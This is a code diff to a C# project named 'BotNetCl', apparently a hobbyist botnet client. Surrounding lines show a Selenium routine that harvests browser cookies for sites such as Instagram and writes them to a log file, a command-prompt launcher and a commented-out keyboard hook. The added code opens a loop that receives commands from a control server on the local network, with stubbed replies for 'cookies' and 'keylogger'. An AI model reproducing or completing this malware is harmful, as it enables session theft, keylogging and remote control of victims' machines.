@@ -244,6 +244,12 @@ namespace BotNetCl
             return key;
         }
 
+
+        public static bool IsAscii(char c)
+        {
+            return c < 128;
+        }
+
         public static void connectsocket()
         {
 
@@ -252,24 +258,24 @@ namespace BotNetCl
                 TcpClient client = new TcpClient();
 
                 // 1. connect
-                client.Connect("192.168.1.102", PORT_NUMBER);
-                Stream stream = client.GetStream();
+                client.Connect("192.168.1.100", PORT_NUMBER);
+                //Stream stream = client.GetStream();
 
-                Console.WriteLine("Connected to Y2Server.");
-                Console.Write("Enter your name: ");
+                //Console.WriteLine("Connected to Y2Server.");
+                //Console.Write("Enter your name: ");
 
-                string str = Console.ReadLine();
+                //string str = Console.ReadLine();
 
-                // 2. send
-                byte[] data = encoding.GetBytes(str);
+                //// 2. send
+                //byte[] data = encoding.GetBytes(str);
 
-                stream.Write(data, 0, data.Length);
+                //stream.Write(data, 0, data.Length);
 
-                // 3. receive
-                data = new byte[BUFFER_SIZE];
-                stream.Read(data, 0, BUFFER_SIZE);
+                //// 3. receive
+                //data = new byte[BUFFER_SIZE];
+                //stream.Read(data, 0, BUFFER_SIZE);
 
-                Console.WriteLine(encoding.GetString(data));
+                //Console.WriteLine(encoding.GetString(data));
 
                 // 4. Close
                 //stream.Close();
@@ -304,7 +310,7 @@ namespace BotNetCl
             {
                 // Navigate to Url
                 driver.Navigate().GoToUrl(url);
-
+             
 
 
                 // Get All available cookies
@@ -318,7 +324,7 @@ namespace BotNetCl
                     // Console.Write($"{cookie.Name}={cookie.Value};");
 
                 }
-                string logNameToWrite = "cookies" + DateTime.Now.ToLongDateString() + logExtendtion;
+                string logNameToWrite = "cookies"  + logExtendtion;
                 StreamWriter sw = new StreamWriter(logNameToWrite, true);
                 sw.WriteLine(DateTime.Now);
                 sw.WriteLine(url);
@@ -336,14 +342,6 @@ namespace BotNetCl
 
         }
 
-        // Phương thức để in danh sách cookies
-        //static void PrintCookies(OpenQA.Selenium.CookieCollection cookies)
-        //{
-        //    foreach (var cookie in cookies)
-        //    {
-        //        Console.WriteLine($"Name: {cookie.Name}, Value: {cookie.Value}");
-        //    }
-        //}
         public static void getCommandPrompt()
         {
             Process cmd = new Process();
@@ -392,8 +390,8 @@ namespace BotNetCl
         {
             //getCommandPrompt();
             //Console.WriteLine(RunCommandAndGetOutput("echo %username%"));
-
-            //HookKeyboard();
+           // connectsocket();
+            // HookKeyboard();
             //string s = Console.ReadLine();
             //Console.WriteLine("echo %username%");
 
@@ -403,15 +401,66 @@ namespace BotNetCl
 
             // string url = Console.ReadLine().Trim();
 
-            string url = "https://www.instagram.com/";
-            getCookies(url);
+            //string url = "https://www.instagram.com/";
+            //getCookies(url);
 
             //ctrl k ctrl d format code
             // ctrl f5
 
 
 
+            try
+            {
+                TcpClient client = new TcpClient();
 
+                // 1. connect
+                client.Connect("192.168.1.100", PORT_NUMBER);
+                Stream stream = client.GetStream();
+
+                //Console.WriteLine("Connected to Y2Server.");
+                //Console.Write("Enter your name: ");
+
+                //string str = Console.ReadLine();
+
+                //// 2. send
+                //byte[] data = encoding.GetBytes(str);
+
+                //stream.Write(data, 0, data.Length);
+
+                // 3. receive
+                while(true)
+                {
+                    byte[] data = new byte[BUFFER_SIZE];
+                    stream.Read(data, 0, BUFFER_SIZE);
+                    string command = encoding.GetString(data);
+
+                    Console.WriteLine(command);
+                    //if(command == "cookies")
+                    //{
+                    //    data = encoding.GetBytes("cookies tra ve");
+                    //    //stream.Write(data, 0, data.Length);
+                        
+                    //}   
+                    //else if(command == "keylogger")
+                    //{
+                    //     data = encoding.GetBytes("keylogger tra ve");
+                    //    stream.Write(data, 0, data.Length);
+                    //}    
+                }    
+                
+
+
+                //Console.WriteLine(encoding.GetString(data));
+
+                // 4. Close
+                //stream.Close();
+                //client.Close();
+            }
+
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex);
+            }
 
         }
 
